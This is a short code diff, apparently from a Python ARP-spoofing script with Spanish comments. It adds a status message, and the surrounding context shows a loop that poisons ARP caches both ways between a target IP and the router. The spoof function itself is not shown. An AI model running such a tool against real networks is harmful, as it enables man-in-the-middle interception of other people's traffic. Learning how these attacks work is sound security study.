@@ -52,6 +52,8 @@ def main():
 
     arguments = get_arguments()
 
+    print("\n[+] Iniciando ARP spoofing...")
+
     while True:
         spoof(arguments.ip_address, "192.168.1.1")  # Mensaje al target
         spoof("192.168.1.1", arguments.ip_address)  # Mensaje al router
